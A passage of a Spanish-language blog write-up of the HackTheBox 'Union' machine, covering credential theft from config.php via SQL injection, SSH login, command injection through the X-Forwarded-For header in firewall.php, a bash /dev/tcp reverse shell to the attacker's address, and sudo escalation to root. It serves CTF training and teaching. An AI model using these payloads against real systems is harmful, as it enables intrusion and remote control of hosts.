</span><span class="gp">Stats: 0:00:10 elapsed;</span><span class="w"> </span>0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
<span class="gp">SYN Stealth Scan Timing: About 22.32% done;</span><span class="w"> </span>ETC: 22:31 <span class="o">(</span>0:00:35 remaining<span class="o">)</span>
<span class="gp">Stats: 0:00:10 elapsed;</span><span class="w"> </span>0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
<span class="gp">SYN Stealth Scan Timing: About 25.35% done;</span><span class="w"> </span>ETC: 22:31 <span class="o">(</span>0:00:29 remaining<span class="o">)</span>
<span class="go">Nmap scan report for 10.10.11.128
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
<span class="go">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.37 seconds
</span></pre></td></tr></tbody></table></code></div></div>
<p>el √∫nico problema es que no tengo credenciales para acceder por ssh ni una clave que me permita acceder directamente, enumerando con la inyecci√≥n load_file(‚Äú‚Äù) hay rutas por defecto en el sistema que guardan archivos importantes de configuraciones como config.php, el servicio emplea php por lo tanto buscar√© en la ruta por defecto en <em>/var/www/html/config.php</em>
<img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp7.png" alt="" data-proofer-ignore></p>

<p>y tenemos credenciales:) solo falta probar si son las mismas para el usuario <strong>uhc</strong> (usuario que extra√≠mos del /etc/passwd)</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre> <span class="cp">&lt;?php</span>
  <span class="nb">session_start</span><span class="p">();</span>
  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span><span class="p">;</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"uhc"</span><span class="p">;</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"uhc-11qual-global-pw"</span><span class="p">;</span>
  <span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"november"</span><span class="p">;</span>

  <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>y efectivamente son las credenciales, por lo tanto tenemos la primera flag</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'uhc-11qual-global-pw'</span> ssh uhc@10.10.11.128    
<span class="go">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
</span><span class="gp">uhc@union:~$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">uhc
</span><span class="gp">uhc@union:~$</span><span class="w"> </span>find <span class="se">\-</span>name user.txt
<span class="go">./user.txt
</span><span class="gp">uhc@union:~$</span><span class="w"> </span>find <span class="se">\-</span>name user.txt | xargs <span class="nb">cat</span>
<span class="go">0217bc461a1f2d56a27b91eabf1dd7cb
</span><span class="gp">uhc@union:~$</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>
<h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>al meternos al directorio /var/www/html/ vemos un firewall.php es emplea X_FORWARDED_FOR y el uso de iptables</p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Authenticated'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">"Access Denied"</span><span class="p">;</span>
  <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">id=</span><span class="s">"bootstrap-css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="c">&lt;!------ Include the above in your HEAD tag ----------&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-center m-5"</span><span class="nt">&gt;</span>Join the UHC - November Qualifiers<span class="nt">&lt;/h1&gt;</span>
		
	<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"bg-dark text-center p-5 mt-4"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container p-5"</span><span class="nt">&gt;</span>
<span class="cp">&lt;?php</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
  <span class="p">};</span>
  <span class="nb">system</span><span class="p">(</span><span class="s2">"sudo /usr/sbin/iptables -A INPUT -s "</span> <span class="mf">.</span> <span class="nv">$ip</span> <span class="mf">.</span> <span class="s2">" -j ACCEPT"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
              <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-white"</span><span class="nt">&gt;</span>Welcome Back!<span class="nt">&lt;/h1&gt;</span>
              <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-white"</span><span class="nt">&gt;</span>Your IP Address has now been granted SSH Access.<span class="nt">&lt;/h3&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;/section&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>este script nos indica que si logramos tener acceso emplea la variable que ser√° nuestra ip seteada donde ip vale la cabezera HTTP_X_FORWARDED_FOR el campo de encabezado HTTP X-Forwarded-For es un m√©todo com√∫n para identificar la direcci√≥n IP de origen de un cliente que se conecta a un servidor web a trav√©s de un proxy HTTP o un equilibrador de carga. HTTP_X_FORWARDED_FOR: si no est√° vac√≠o indica que se ha utilizado un proxy. Al pasar por el proxy lo que hace √©ste es poner su direcci√≥n IP como REMOTE_ADDR y a√±adir la que estaba como REMOTE_ADDR al final de esta cabecera. es por eso que una vez que ponemos la flag correcta nos habilita el puerto aceptando solo nuestra ip por medio de ip tables, delante de ip hay un campo que podr√≠a seguir otro comando que yo le indique a nivel de sistema, por lo tanto agregare la cabezera primero</p>

<p><strong>X-FORWARDED-FOR:</strong></p>

<p>seguido de la data que quiera inyectar en $ip donde hace la comparacion en el script de php, por ejemplo en este caso me enviar√© una traza icmp para ver si tengo un RCE,quedando de la siguiente forma</p>

<p><strong>X-FORWARDED-FOR: ;ping -c 1 10.10.14.8;</strong>
<img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp8.png" alt="" data-proofer-ignore></p>

<p>y logramos tener traza icmp
<img data-src="/assets/img/commons/Union//assets/img/commons/Union/terminal.png" alt="" data-proofer-ignore>
solo nos queda enviarnos una reverse shell</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">X-FORWARDED-FOR: ;</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/terminal1.png" alt="" data-proofer-ignore></p>

<p>estamos como www-data y si doy sudo -l para observar que puedo ejecutar como nivel de sudo vemos una ruta de path, solo con un sudo su tendr√≠a que estar dentro sin proporcionar contrase√±a</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">challenge.php  config.php  css	firewall.php  index.php
</span><span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">sudo </span>su
<span class="gp">root@union:/var/www/html#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">root@union:/var/www/html#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt 
<span class="go">e382630e05c003779f3b38e973137516
</span><span class="gp">root@union:/var/www/html#</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>
<p>por fin tenemos la flag y otra m√°quina mas hecha:)!</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>HackTheBox</a>,
      <a href='/categories/machines-medium/'>Machines Medium</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >Writeup</a>
      
      <a href="/tags/gu%C3%ADas/"
          class="post-tag no-text-decoration" >Gu√≠as</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/sqli/"
          class="post-tag no-text-decoration" >SQLI</a>
      
      <a href="/tags/web/"
          class="post-tag no-text-decoration" >Web</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada est√° licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Union+Writeup+-+Droix3d+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUnion%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Union+Writeup+-+Droix3d+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUnion%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUnion%2F&text=Union+Writeup+-+Droix3d+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¬°Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/gu%C3%ADas/">Gu√≠as</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">Writeup</a>
    
      
      <a class="post-tag" href="/tags/dns/">DNS</a>
    
      
      <a class="post-tag" href="/tags/domain-zone-transfer-attack/">Domain Zone Transfer Attack</a>
    
      
      <a class="post-tag" href="/tags/introduccion/">Introduccion</a>
    
      
      <a class="post-tag" href="/tags/introducci%C3%B3n/">Introducci√≥n</a>
    
      
      <a class="post-tag" href="/tags/redes/">Redes</a>
    
      
      <a class="post-tag" href="/tags/sqli/">SQLI</a>
    
      
      <a class="post-tag" href="/tags/web/">Web</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->



  
    
    
      
      
        
        
        
          



  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/Trick/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1675749600"
    data-df="YYYY-MM-DD"
    >
  2023-02-07
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Trick Writeup</h3>
            <div class="text-muted small">
              <p>
                





                10.10.11.166 Trick (easy machine) vengo a traer otra gu√≠a para la maquina trick de HackTheBox tocando y explicando acerca del ataque de transferencia de zona, una de las vulnerabilides presentes en...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/SolidState/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1675058400"
    data-df="YYYY-MM-DD"
    >
  2023-01-30
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SolidState Writeup</h3>
            <div class="text-muted small">
              <p>
                





                

10.10.10.51 SolidState (medium machine)


  Comenzamos con la fase de recolecci√≥n de informaci√≥n haciendo un escaneo por TCP en todos los puertos con nmap


$ nmap -p-  -sS -vvv  --min-rate 2000 ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Introduccion_Redes/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1676268000"
    data-df="YYYY-MM-DD"
    >
  2023-02-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Introducci√≥n a redes Modelo OSI - Fundamentos</h3>
            <div class="text-muted small">
              <p>
                





                Qu√© es una red?
es un conjunto de equipos conectados por medio de cables, se√±ales, ondas o cualquier otro m√©todo de transporte de datos, comparten cierta informaci√≥n conectadas entre si para la tra...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/SolidState/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>SolidState Writeup</p>
  </a>
  

  
  <a href="/posts/Trick/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>Trick Writeup</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        ¬© 2023
        <a href="https://twitter.com/OmarDroixed">Omar Vlz Aka(Droix3d)</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique expl√≠citamente, las entradas de este blog est√°n licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/gu%C3%ADas/">Gu√≠as</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">Writeup</a>
    
      
      <a class="post-tag" href="/tags/dns/">DNS</a>
    
      
      <a class="post-tag" href="/tags/domain-zone-transfer-attack/">Domain Zone Transfer Attack</a>
    
      
      <a class="post-tag" href="/tags/introduccion/">Introduccion</a>
    
      
      <a class="post-tag" href="/tags/introducci%C3%B3n/">Introducci√≥n</a>
    
      
      <a class="post-tag" href="/tags/redes/">Redes</a>
    
      
      <a class="post-tag" href="/tags/sqli/">SQLI</a>
    
      
      <a class="post-tag" href="/tags/web/">Web</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versi√≥n de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¬°Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

